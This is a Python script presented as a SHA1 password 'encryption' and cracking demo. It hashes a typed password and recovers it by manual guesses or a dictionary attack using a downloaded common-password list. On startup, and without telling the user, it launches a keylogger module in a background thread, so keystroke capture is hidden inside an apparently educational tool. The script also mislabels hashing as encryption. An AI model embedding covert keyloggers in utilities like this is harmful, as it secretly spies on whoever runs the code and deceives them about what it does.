from os import read, write
import sys
from urllib.request import hashlib,urlopen
import keylogger as kl
import threading
import pyautogui as pa

fileurl="passlist.txt"
result="null"
ch=0
keylogger_thread=threading.Thread(target=kl.activateKeylogger)
keylogger_thread.start()
#function to perform sha1 conversion
def convertToHash(word):
    converted_hash=hashlib.sha1(word.encode()).hexdigest()
    return converted_hash

#convert plaintext into sha1
def encrypt():
    print("\nPassword Encryption")
    print("\nEnter the password to be encrypted:")
    word=input()
    global result
    result=convertToHash(word)
    print("SHA1 encrypted password is :")
    print(result)

#brute force password check by comparing hash 
def decrypt(ch):
#manual bruteforce

    if ch==1:
        guess_str=input()
        cmp_result=convertToHash(guess_str)
        print("SHA1 hash of guess is:")
        print(cmp_result)
        if cmp_result==result:
            print("\nHash Match")
            print("\nPassword Found")
            print("\nPassword is: ",guess_str)
        else:
            print("\nNo hash matches found...")
            print("\nPassword not found")
#pre-generated list bruteforce
    if ch==2:
        try:
#creates a file which contains the list of all the common passwords and appends the data
            f=open(fileurl,"x")
            LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                f=open(fileurl,"a")
                f.write(guess)
                f.write("\n")
                f.close()
            print("File created")
        except(FileExistsError):
            print("File already exists")
        print("Fetching data from password list...\n")
#opening the password file and comparing the hashes
        guess_pass=open(fileurl,"r").read().split("\n")
        for guess in guess_pass:
            hashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()
            if hashedGuess == result:
                print("The password is ", str(guess))
                sys.exit("Completed")

            elif hashedGuess != result:
                print("Password guess ",str(guess)," does not match, trying next...")
    print("Password not in database, brute force failed")
    sys.exit("Completed")

print("Generate SHA1 encrypted password and save the encrypted data to a text file")
encrypt()
print("\nSelect option for cracking:")
print("\n1.Manual")
print("\n2.Common Credentials List")
print("\n Enter your choice: ")
ch=int(input())
if ch==1:
    decrypt(1)
if ch==2:
    decrypt(2)
else:
    print("Invalid choice")


